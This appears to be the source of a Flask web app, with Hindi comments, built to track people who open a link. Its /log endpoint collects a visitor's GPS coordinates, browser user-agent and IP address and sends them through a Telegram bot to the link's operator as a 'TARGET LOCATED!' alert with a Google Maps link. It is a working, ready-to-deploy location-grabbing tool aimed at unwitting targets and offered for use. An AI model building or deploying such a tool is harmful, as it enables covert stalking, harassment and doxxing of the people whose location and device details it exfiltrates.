from flask import Flask, render_template, request
import telebot
import os

app = Flask(__name__)
bot = telebot.TeleBot(os.getenv("BOT_TOKEN"))

@app.route('/')
def home():
    return render_template('index.html', user_id=request.args.get('id'))

@app.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    uid = request.args.get('id')
    
    # डिवाइस की जानकारी यहाँ से मिलेगी
    user_agent = request.headers.get('User-Agent')
    ip_addr = request.remote_addr

    if lat and lon:
        maps = f"https://www.google.com/maps?q={lat},{lon}"
        
        # मैसेज में डिवाइस इन्फो भी जोड़ दी गई है
        msg = (
            f"🚨 **TARGET LOCATED!**\n\n"
            f"📍 **Maps:** [Click Here]({maps})\n"
            f"📱 **Device Info:** `{user_agent}`\n"
            f"🌐 **IP Address:** `{ip_addr}`\n\n"
            f"✨ **Created by Roshan Ali** ✨"
        )
        
        try:
            bot.send_message(uid, msg, parse_mode="Markdown")
        except Exception as e:
            print(f"Error sending message: {e}")
            
    return "OK"

if __name__ == "__main__":
    app.run()
    
